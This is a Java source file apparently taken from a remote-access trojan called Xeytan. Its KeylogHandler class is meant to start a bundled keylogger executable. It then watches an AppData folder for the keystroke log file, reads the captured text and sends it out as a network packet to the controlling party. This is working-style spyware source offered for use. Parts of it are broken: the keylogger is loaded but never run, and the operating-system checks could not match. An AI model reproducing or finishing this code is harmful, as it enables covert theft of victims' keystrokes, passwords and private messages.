package com.melardev.xeytanj.services;

import com.melardev.xeytanj.IApplication;
import com.melardev.xeytanj.logger.ILogger;
import com.melardev.xeytanj.net.packets.PacketKeylog;
import com.melardev.xeytanj.remote.PacketHandler;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.*;
import java.util.HashMap;
import java.util.Map;

import static java.nio.file.StandardWatchEventKinds.*;

public class KeylogHandler implements PacketHandler<PacketKeylog> {

    private final IApplication application;
    private WatchService watcher;
    private Map<WatchKey, Path> keys;
    private File loggerFile;
    private boolean trace;
    private ILogger logger;


    public KeylogHandler(IApplication application) {
        this.application = application;
    }

    public void init() {
        try {
            logger.traceCurrentMethodName();
            launchKeylogger();

            this.watcher = FileSystems.getDefault().newWatchService();
            this.keys = new HashMap<WatchKey, Path>();
            String pathLogger = System.getenv("APPDATA") + "\\Xeytan";
            Path dir = Paths.get(pathLogger);
            register(dir);
            new Thread(this::processEvents).start();
        } catch (IOException e) {
            e.printStackTrace();
        }
        // enable trace after initial registration
    }

    private void launchKeylogger() {
        logger.traceCurrentMethodName();
        String os = System.getProperty("os.name");
        if (os.equals("windows")) {
            getClass().getResourceAsStream("/executables/keylogger/windows/keylogger.exe");
        } else if (os.equals("linux")) {
            getClass().getResourceAsStream("/executables/keylogger/linux/keylogger");
        }
    }

    @SuppressWarnings("unchecked")
    static <T> WatchEvent<T> cast(WatchEvent<?> event) {
        return (WatchEvent<T>) event;
    }

    /**
     * Register the given directory with the WatchService
     */
    private void register(Path dir) throws IOException {
        logger.traceCurrentMethodName();
        WatchKey key = dir.register(watcher, ENTRY_CREATE, ENTRY_DELETE, ENTRY_MODIFY);
        if (trace) {
            Path prev = keys.get(key);
            if (prev == null) {
                System.out.format("register: %s\n", dir);
            } else {
                if (!dir.equals(prev)) {
                    System.out.format("update: %s -> %s\n", prev, dir);
                }
            }
        }
        keys.put(key, dir);
    }

    /**
     * Process all events for keys queued to the watcher
     */
    void processEvents() {
        logger.traceCurrentMethodName();
        for (; ; ) {
            WatchKey key;
            try {
                key = watcher.take();
            } catch (InterruptedException x) {
                return;
            }
            Path dir = keys.get(key);
            if (dir == null) {
                System.err.println("WatchKey not recognized!!");
                continue;
            }

            for (WatchEvent<?> event : key.pollEvents()) {
                WatchEvent.Kind kind = event.kind();
                if (kind == OVERFLOW) {
                    continue;
                }
                WatchEvent<Path> ev = cast(event);
                Path name = ev.context();
                Path child = dir.resolve(name);
                System.out.format("%s: %s\n", event.kind().name(), child);
                if ((kind == ENTRY_CREATE)) {
                    File f = child.toFile();
                    if (f.isFile() && f.getName().equals("xeytanLogger.txt")) {
                        System.out.println("file created");
                        loggerFile = f;
                    }
                }

                if (kind == ENTRY_MODIFY) {
                    File f = child.toFile();
                    if (f.isFile() && f.getName().equals("xeytanLogger.txt")) {
                        System.out.println("file created");
                        loggerFile = f;
                        StringBuilder sb = new StringBuilder();
                        try {
                            BufferedReader reader = new BufferedReader(new FileReader(f));
                            char[] buffer = new char[(int) f.length()];
                            reader.read(buffer);
                            System.out.println(buffer.length + " bytes sent");
                            PacketKeylog packet = new PacketKeylog(new String(buffer));
                            application.sendPacket(packet);
                        } catch (IOException e) {
                            return;
                        }
                    }
                }
            }

            // reset key and remove from set if directory no longer accessible
            boolean valid = key.reset();
            if (!valid) {
                keys.remove(key);

                // all directories are inaccessible
                if (keys.isEmpty()) {
                    break;
                }
            }
        }
    }

    @Override
    public void handlePacket(PacketKeylog packet) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }
}
